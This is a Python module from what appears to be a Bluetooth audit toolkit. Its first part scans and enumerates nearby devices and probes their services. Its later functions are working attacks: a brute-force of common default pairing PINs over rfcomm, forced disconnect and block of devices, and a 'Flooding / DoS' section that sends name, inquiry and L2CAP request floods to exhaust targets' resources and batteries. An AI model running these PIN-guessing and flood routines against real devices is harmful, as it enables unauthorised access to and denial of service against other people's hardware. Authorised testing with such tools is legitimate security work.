"""Bluetooth scanner, enumerator, and basic audit tools."""

import os
import re
import time
import subprocess
import shutil
from pathlib import Path

from core.run import run as _run
from core.tools import lookup_mac


BT_ADAPTER = "hci0"


def bt_status() -> dict:
    """Get Bluetooth adapter status."""
    info = {"available": False, "address": "", "state": "", "name": ""}
    out = _run(["hciconfig", BT_ADAPTER], timeout=5)
    m = re.search(r"BD Address:\s*([0-9A-F:]+)", out)
    if m:
        info["available"] = True
        info["address"] = m.group(1)
    if "UP" in out and "RUNNING" in out:
        info["state"] = "UP RUNNING"
    elif "UP" in out:
        info["state"] = "UP"
    else:
        info["state"] = "DOWN"
    m = re.search(r"Name:\s*'(.+)'", out)
    if m:
        info["name"] = m.group(1)
    return info


def hcitool_scan(timeout=10) -> list[dict]:
    """Scan for Bluetooth devices using hcitool."""
    devices = []
    out = _run(["hcitool", "scan", "--flush"], timeout=timeout + 5)
    for line in out.split("\n"):
        m = re.match(r"\s+([0-9A-F:]{17})\s+(.+)", line)
        if m:
            mac = m.group(1).strip()
            name = m.group(2).strip()
            vendor = lookup_mac(mac)
            devices.append({"mac": mac, "name": name, "vendor": vendor, "type": "BR/EDR"})
    return devices


def bluetoothctl_scan(timeout=12) -> list[dict]:
    """Scan for BT/BLE devices using bluetoothctl."""
    devices = []
    try:
        proc = subprocess.Popen(
            ["bluetoothctl"], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.PIPE, text=True,
        )
        proc.stdin.write("scan on\n")
        proc.stdin.flush()
        time.sleep(timeout)
        proc.stdin.write("scan off\nquit\n")
        proc.stdin.flush()
        stdout, _ = proc.communicate(timeout=10)
    except Exception:
        return devices
    for line in stdout.split("\n"):
        m = re.search(r"Device\s+([0-9A-F:]{17})\s+(.+)", line)
        if m:
            mac = m.group(1).upper()
            name = m.group(2).strip()
            vendor = lookup_mac(mac)
            devices.append({"mac": mac, "name": name, "vendor": vendor, "type": "BLE"})
    return devices


def lescan(timeout=10) -> list[dict]:
    """Scan for BLE devices using hcitool lescan."""
    devices = []
    out = _run(["timeout", str(timeout), "hcitool", "lescan"], timeout=timeout + 5)
    for line in out.split("\n"):
        m = re.match(r"([0-9A-F:]{17})\s+(.+)", line)
        if m:
            mac = m.group(1).upper()
            name = m.group(2).strip()
            if name.lower() not in ("unknown", "n/a"):
                vendor = lookup_mac(mac)
                devices.append({"mac": mac, "name": name, "vendor": vendor, "type": "BLE"})
    return devices


def scan_all(timeout=12) -> list[dict]:
    """Run both hcitool and BLE scan, deduplicate."""
    seen = set()
    all_devices = []
    for dev in hcitool_scan(timeout):
        if dev["mac"] not in seen:
            seen.add(dev["mac"])
            all_devices.append(dev)
    for dev in lescan(timeout):
        if dev["mac"] not in seen:
            seen.add(dev["mac"])
            all_devices.append(dev)
    return all_devices


def device_info(mac: str) -> dict:
    """Get detailed info about a specific BT device."""
    info = {"mac": mac, "name": "", "vendor": lookup_mac(mac), "rssi": "", "services": []}
    out = _run(["hcitool", "name", mac], timeout=5)
    info["name"] = out.strip()
    out = _run(["hcitool", "rssi", mac], timeout=5)
    m = re.search(r"RSSI:\s*(-?\d+)", out)
    if m:
        info["rssi"] = m.group(1)
    out = _run(["sdptool", "browse", mac], timeout=15)
    for line in out.split("\n"):
        m = re.search(r"Service Name:\s*(.+)", line)
        if m:
            info["services"].append(m.group(1).strip())
        m = re.search(r"Service Description:\s*(.+)", line)
        if m:
            info["services"].append(m.group(1).strip())
    return info


def l2ping(mac: str, count: int = 3) -> str:
    """Ping a BT device to check reachability."""
    return _run(["l2ping", "-c", str(count), mac], timeout=15)


def device_rssi(mac: str) -> str:
    """Get RSSI of a connected/paired device."""
    out = _run(["hcitool", "rssi", mac], timeout=5)
    m = re.search(r"RSSI:\s*(-?\d+)", out)
    return m.group(1) if m else "N/A"


def bt_audit(mac: str, line_callback=None) -> dict:
    """Run a full BT audit against a target device."""
    report = {"mac": mac, "name": "", "vendor": "", "rssi": "", "services": [], "l2ping": "", "open_ports": []}

    def log(msg):
        if line_callback:
            line_callback(msg)

    log(f"[cyan]Auditing BT device: {mac}[/]")
    info = device_info(mac)
    report["name"] = info["name"]
    report["vendor"] = info["vendor"]
    report["rssi"] = info["rssi"]
    report["services"] = info["services"]
    log(f"  Name: {info['name']}")
    log(f"  Vendor: {info['vendor']}")
    log(f"  RSSI: {info.get('rssi', 'N/A')}")
    log(f"  Services ({len(info['services'])}): {', '.join(info['services'][:10])}")
    report["l2ping"] = l2ping(mac)
    log(f"  L2Ping: {'Reachable' if 'bytes' in report['l2ping'] else 'Unreachable'}")

    # RFCOMM port scan (common BT SP profiles)
    log("[cyan]  Scanning RFCOMM channels 1-15...[/]")
    for ch in range(1, 16):
        r = _run(["sdptool", "records", "--channel", str(ch), mac], timeout=3)
        if r.strip():
            report["open_ports"].append(ch)
            log(f"    Channel {ch}: data")
    log(f"  Found {len(report['open_ports'])} open RFCOMM channels")
    log("[green]BT audit complete[/]")
    return report


# ─── Encryption Test ──────────────────────────────────────

def bt_encryption_test(mac: str, callback=None) -> dict:
    """Test Bluetooth encryption by attempting pairing + pin discovery.

    Tries common PINs to detect weak pairing (Just Works / no MITM protection).
    Returns pairing mode info and which PINs succeeded.
    """
    def log(msg):
        if callback:
            callback(msg)

    result = {"mac": mac, "pairing_mode": "unknown", "tested_pins": [], "vulnerable": False}
    log(f"[cyan]Testing BT encryption on {mac}[/]")

    # Check if device accepts l2ping (is reachable)
    ping = l2ping(mac, count=1)
    if "bytes" not in ping:
        result["pairing_mode"] = "unreachable"
        log("[red]Device unreachable — cannot test encryption[/]")
        return result
    log("[green]Device is reachable[/]")

    # Try common default PINs via sdptool
    common_pins = ["0000", "1111", "1234", "9999", "0001", "1212", "7777",
                   "1004", "2000", "2001", "8888", "5555", "000000", "111111"]
    log("[cyan]Testing common PINs via rfcomm...[/]")
    for pin in common_pins:
        try:
            proc = subprocess.Popen(
                ["rfcomm", "connect", mac, "1", pin],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            )
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()
            # If returncode 0, PIN worked
            if proc.returncode == 0:
                result["tested_pins"].append({"pin": pin, "result": "accepted"})
                result["vulnerable"] = True
                log(f"  [red]PIN {pin}: ACCEPTED[/]")
            else:
                stderr = proc.stderr.read() if proc.stderr else ""
                result["tested_pins"].append({"pin": pin, "result": "rejected"})
        except FileNotFoundError:
            result["tested_pins"].append({"pin": pin, "result": "no rfcomm"})
        except Exception:
            result["tested_pins"].append({"pin": pin, "result": "error"})

    # Analyze results
    accepted = [p for p in result["tested_pins"] if p["result"] == "accepted"]
    if accepted:
        result["pairing_mode"] = "weak_pins"
        log(f"[red]Weak encryption: device accepts default PINs: "
            f"{', '.join(p['pin'] for p in accepted)}[/]")
    else:
        result["pairing_mode"] = "no_default_pins"
        log("[green]No default PINs accepted — pairing likely requires user interaction[/]")
        log("[dim]Note: Just Works pairing (no MITM protection) cannot be detected without pairing[/]")

    result["tested_count"] = len(result["tested_pins"])
    log(f"[cyan]Tested {result['tested_count']} PINs[/]")
    return result


def bt_disconnect_target(mac: str, callback=None) -> str:
    """Force-disconnect a Bluetooth device using btmgmt or bluetoothctl."""
    def log(msg):
        if callback:
            callback(msg)
    log(f"[cyan]Disconnecting {mac}...[/]")
    out = _run(["bluetoothctl", "disconnect", mac], timeout=10)
    if "Successful" in out or "disconnected" in out.lower():
        log(f"[green]Disconnected {mac}[/]")
    else:
        log(f"[yellow]Disconnect result: {out.strip()[:100]}[/]")
    return out


def bt_block_device(mac: str, callback=None) -> str:
    """Block a Bluetooth device to prevent reconnection."""
    def log(msg):
        if callback:
            callback(msg)
    log(f"[cyan]Blocking {mac}...[/]")
    out = _run(["bluetoothctl", "block", mac], timeout=10)
    log(f"[green]Block result: {out.strip()[:100]}[/]")
    return out


def bt_unblock_device(mac: str) -> str:
    """Unblock a previously blocked Bluetooth device."""
    return _run(["bluetoothctl", "unblock", mac], timeout=10)


# ─── BT Flooding / DoS ───────────────────────────────────

def bt_name_flood(target_mac: str, count: int = 50, callback=None) -> dict:
    """Flood a target with spoofed BT name requests to disrupt pairing.

    Sends repeated hcitool name requests to consume target's resources.
    """
    def log(msg):
        if callback:
            callback(msg)

    result = {"sent": 0, "target": target_mac, "error": None}
    log(f"[bold yellow]BT name flood: {target_mac} × {count} requests[/]")

    # Verify target is reachable first
    ping = l2ping(target_mac, count=1)
    if "bytes" not in ping:
        result["error"] = "Target unreachable"
        log("[red]Target unreachable — cannot flood[/]")
        return result

    for i in range(count):
        try:
            subprocess.Popen(
                ["hcitool", "name", target_mac],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            result["sent"] += 1
            if callback and i % 10 == 0:
                log(f"  Sent {i + 1}/{count} name requests")
        except Exception:
            pass

    log(f"[green]Flood complete: {result['sent']}/{count} requests sent to {target_mac}[/]")
    return result


def bt_inquiry_flood(duration: int = 15, callback=None) -> dict:
    """Flood the local BT environment with rapid inquiry scans.

    Causes nearby devices to respond repeatedly, consuming their battery/resources.
    """
    def log(msg):
        if callback:
            callback(msg)

    result = {"scans": 0, "duration": duration, "error": None}
    log(f"[bold yellow]BT inquiry flood: continuous scanning for {duration}s[/]")

    start = time.time()
    while time.time() - start < duration:
        try:
            subprocess.Popen(
                ["hcitool", "scan", "--flush"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            result["scans"] += 1
            time.sleep(0.3)
        except Exception:
            pass

    log(f"[green]Flood complete: {result['scans']} inquiry scans in {duration}s[/]")
    return result


def bt_l2cap_flood(target_mac: str, count: int = 30, callback=None) -> dict:
    """Flood target with L2CAP connection requests to exhaust resources."""
    def log(msg):
        if callback:
            callback(msg)

    result = {"sent": 0, "target": target_mac, "error": None}
    log(f"[bold yellow]BT L2CAP flood: {target_mac} × {count} connections[/]")

    ping = l2ping(target_mac, count=1)
    if "bytes" not in ping:
        result["error"] = "Target unreachable"
        log("[red]Target unreachable[/]")
        return result

    for i in range(count):
        try:
            subprocess.Popen(
                ["l2ping", "-c", "1", "-t", "1", target_mac],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            result["sent"] += 1
            if callback and i % 10 == 0:
                log(f"  Sent {i + 1}/{count} L2CAP requests")
        except Exception:
            pass

    log(f"[green]Flood complete: {result['sent']}/{count} L2CAP requests[/]")
    return result
